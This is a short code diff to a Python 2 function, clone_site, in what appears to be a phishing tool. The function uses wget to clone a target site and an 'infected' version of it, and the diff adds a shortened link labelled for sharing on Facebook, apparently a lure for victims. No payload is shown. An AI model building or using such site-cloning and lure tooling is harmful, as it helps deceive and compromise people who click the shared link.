@@ -18,10 +18,23 @@ def clone_site():
 	try:
 		subprocess.Popen('rm -f tmp/clone.html', shell=True) #wget is weird and appends code rather than overwrite, so rm first
 		subprocess.Popen('rm -f tmp/infected.html', shell=True)
-		print "[+] Cloning websites...\n"
+		
+		print ""
+		print "[+] Cloning websites..."
+		
 		subprocess.Popen('cd tmp/; wget --no-check-certificate -O clone.html -N -c -k %s' % (site_clone), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 		subprocess.Popen('cd tmp/; wget --no-check-certificate -O infected.html -N -c -k %s' % (infected_clone), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+		
 		print "[+] Clone complete..."
+		print ""
+		
+		import shorten
+		short_url = shorten.shorten_url()
+
+		print ""
+		print "Link to share on Facebook: " + str(short_url)
+		print ""
+		print ""
 
 	except KeyboardInterrupt:
 		print "[!] CTRL+C Detected. Exiting..."
